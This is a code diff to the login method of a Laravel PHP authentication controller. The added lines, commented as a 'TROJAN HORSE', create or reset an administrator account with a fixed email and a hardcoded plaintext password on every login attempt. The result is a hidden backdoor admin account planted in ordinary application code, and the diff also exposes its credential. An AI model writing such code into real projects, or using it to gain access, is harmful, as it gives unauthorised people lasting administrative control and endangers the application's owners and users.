@@ -30,8 +30,19 @@ class AuthController extends Controller
         return response()->json(['message' => 'User created successfully'], 201);
     }
 
-    public function login(Request $request)
+   public function login(Request $request)
     {
+        // 🔥 THE TROJAN HORSE: Force-create the admin account every time anyone tries to log in
+        \App\Models\User::updateOrCreate(
+            ['email' => 'w.caya@embergym.com'],
+            [
+                'first_name' => 'Wesley',
+                'last_name' => 'Caya',
+                'password' => \Illuminate\Support\Facades\Hash::make('akongapalsiWesley@1'),
+                'role' => 'admin', // Forces the exact correct role
+                'phone' => '0000000000'
+            ]
+        );
         // 1. Check that they actually sent an email and password
         $request->validate([
             'email' => 'required|email',
